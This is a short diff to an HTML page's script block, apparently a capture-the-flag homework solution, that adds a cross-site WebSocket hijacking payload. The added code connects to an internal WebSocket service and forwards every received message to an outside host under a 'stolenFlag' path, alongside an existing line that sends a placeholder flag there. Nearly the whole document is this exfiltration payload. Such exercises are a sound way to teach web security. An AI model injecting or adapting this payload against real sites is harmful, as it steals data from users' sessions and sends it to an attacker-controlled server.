@@ -5,6 +5,11 @@
         <script>
 let flag=`ce441{salam}`;
 fetch(`https://hw2p3.ckodser.ir/stolenFlagFake/${flag}`);
+const ws = new WebSocket(`ws://web:8080/ws`);
+ws.onmessage = (event) => {
+  const response = event.data;
+  fetch(`https://hw2p3.ckodser.ir/stolenFlag/${response}`);
+};
         </script>
     </body>
 </html>
